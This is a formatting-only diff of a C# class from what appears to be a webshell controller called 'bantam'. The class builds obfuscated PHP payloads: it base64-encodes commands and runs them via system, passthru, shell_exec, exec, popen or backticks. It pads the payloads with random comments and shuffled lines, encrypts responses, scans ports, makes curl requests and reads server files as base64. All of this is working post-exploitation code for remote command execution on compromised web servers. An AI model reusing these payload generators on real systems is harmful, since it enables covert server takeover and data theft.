@@ -44,8 +44,7 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string RandomPHPComment()
         {
-            if (!Config.InjectRandomComments)
-            {
+            if (!Config.InjectRandomComments) {
                 return string.Empty;
             }
 
@@ -53,8 +52,7 @@ namespace bantam.Classes
             int maxCommentLength = Config.CommentMaxLength;
             int commentFreqency = Config.CommentFrequency;
 
-            if (randomNumber <= commentFreqency)
-            {
+            if (randomNumber <= commentFreqency) {
                 int randomLength = Helper.RandomNumber(maxCommentLength);
                 return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
             }
@@ -79,8 +77,7 @@ namespace bantam.Classes
 
             Helper.ShuffleList(shuffleableLines);
 
-            foreach (var line in shuffleableLines)
-            {
+            foreach (var line in shuffleableLines) {
                 linesRandomized.Append(RandomPHPComment());
                 linesRandomized.Append(line);
             }
@@ -148,16 +145,11 @@ namespace bantam.Classes
                               + varName + " = base64_encode(" + varName + ");"
                               + RandomPHPComment();
 
-            if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL)
-            {
+            if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                 encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-            }
-            else if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT)
-            {
+            } else if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                 encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
-            }
-            else
-            {
+            } else {
                 LogHelper.AddGlobalLog("Unknown encryption type selected.", "GUI Failure", LogHelper.LOG_LEVEL.ERROR);
                 return string.Empty;
             }
@@ -210,18 +202,14 @@ namespace bantam.Classes
 
             Helper.ShuffleList(shuffleableLines);
 
-            foreach (var line in shuffleableLines)
-            {
+            foreach (var line in shuffleableLines) {
                 linesRandomized.Append(line);
                 linesRandomized.Append(RandomPHPComment());
             }
 
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 responseCode = "$result = ";
-            }
-            else
-            {
+            } else {
                 responseCode = "echo ";
             }
 
@@ -255,8 +243,7 @@ namespace bantam.Classes
                 "}"
             };
 
-            foreach (var line in userInfoLines)
-            {
+            foreach (var line in userInfoLines) {
                 userLines.Append(line);
                 userLines.Append(RandomPHPComment());
             }
@@ -324,8 +311,7 @@ namespace bantam.Classes
             string errNoVar = RandomPHPVar();
             string hasResVar = RandomPHPVar();
 
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 return "$result='';"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
@@ -336,9 +322,7 @@ namespace bantam.Classes
                              + "fclose(" + connectionVar + ");"
                         + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
-            }
-            else
-            {
+            } else {
                 return hasResVar + "=0;"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
@@ -364,8 +348,7 @@ namespace bantam.Classes
             string responseCode = string.Empty;
             string curlVar = RandomPHPVar();
 
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 responseCode = "$result = ";
             }
 
@@ -385,8 +368,7 @@ namespace bantam.Classes
                  "curl_close(" + curlVar + ");"
             };
 
-            foreach (var line in lines)
-            {
+            foreach (var line in lines) {
                 result.Append(RandomPHPComment());
                 result.Append(line);
             }
@@ -407,65 +389,40 @@ namespace bantam.Classes
             string randomvarName = RandomPHPVar();
             string b64Code = Helper.EncodeBase64ToString(code);
 
-            if (encryptResponse)
-            {
-                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM)
-                {
+            if (encryptResponse) {
+                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                     result = phpOb_Start + "@system(base64_decode('" + b64Code + "'));" + phpOb_End;
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                     result = phpOb_Start + "@passthru(base64_decode('" + b64Code + "'));" + phpOb_End;
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                     result = "$result = shell_exec(base64_decode('" + b64Code + "'));";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                     result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                            + "$result = @join(PHP_EOL, " + randomvarName + ");";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                     result = "$result = ''; if(is_resource(" + randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                            + "while (!@feof(" + randomvarName + ")) { $result .= fread(" + randomvarName + ", 1024); }"
                            + "pclose(" + randomvarName + ");"
                            + "}";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                     result = randomvarName + " = base64_decode('" + b64Code + "'); $result = `" + randomvarName + "`;";
                 }
-            }
-            else
-            {
-                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM)
-                {
+            } else {
+                if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SYSTEM) {
                     result = "@system(base64_decode('" + b64Code + "'));";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.PASSTHRU) {
                     result = "@passthru(base64_decode('" + b64Code + "'));";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.SHELL_EXEC) {
                     result = "echo shell_exec(base64_decode('" + b64Code + "'));";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.EXEC) {
                     result = "@exec(base64_decode('" + b64Code + "'), " + randomvarName + ");"
                            + "echo @join(PHP_EOL, " + randomvarName + ");";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.POPEN) {
                     result = "if(is_resource(" + randomvarName + " = @popen(base64_decode('" + b64Code + "'), 'r'))) {"
                            + "while (!@feof(" + randomvarName + ")) { echo fread(" + randomvarName + ", 1024); }"
                            + "pclose(" + randomvarName + ");"
                            + "}";
-                }
-                else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS)
-                {
+                } else if (Config.PhpShellCodeExectionVectorValue == (int)Options.PHP_SHELL_CODE_VECTORS.BACKTICKS) {
                     result = "echo `base64_decode('" + b64Code + "')`";
                 }
             }
@@ -480,14 +437,11 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string PhpInfo(bool encryptResponse)
         {
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 return phpOb_Start
                       + "phpinfo();"
                       + phpOb_End;
-            }
-            else
-            {
+            } else {
                 return "phpinfo();";
             }
         }
@@ -499,12 +453,9 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string PhpTestExecutionWithEcho1(bool encryptReponse)
         {
-            if (encryptReponse)
-            {
+            if (encryptReponse) {
                 return "$result = '1';";
-            }
-            else
-            {
+            } else {
                 return "echo '1';";
             }
         }
@@ -521,12 +472,9 @@ namespace bantam.Classes
             string driveVar = RandomPHPVar();
             string responseCode = string.Empty;
 
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 responseCode = "$result .= ";
-            }
-            else
-            {
+            } else {
                 responseCode = "echo ";
             }
 
@@ -537,8 +485,7 @@ namespace bantam.Classes
                 "}}"
             };
 
-            foreach (var line in lines)
-            {
+            foreach (var line in lines) {
                 result.Append(RandomPHPComment());
                 result.Append(line);
             }
@@ -553,12 +500,9 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
         {
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 return "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
-            }
-            else
-            {
+            } else {
                 return "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
             }
         }
@@ -571,12 +515,9 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string ReadFileToBase64(string fileName, bool encryptResponse)
         {
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 return "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
-            }
-            else
-            {
+            } else {
                 return "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
             }
         }
@@ -617,12 +558,9 @@ namespace bantam.Classes
             string responseCode = string.Empty;
             string varException = RandomPHPVar();
 
-            if (encryptResponse)
-            {
+            if (encryptResponse) {
                 responseCode = "$result .= ";
-            }
-            else
-            {
+            } else {
                 responseCode = "echo ";
             }
 
@@ -640,8 +578,7 @@ namespace bantam.Classes
                  "}}catch(Exception " + varException + "){ }"
             };
 
-            foreach (var line in lines)
-            {
+            foreach (var line in lines) {
                 result.Append(RandomPHPComment());
                 result.Append(line);
             }
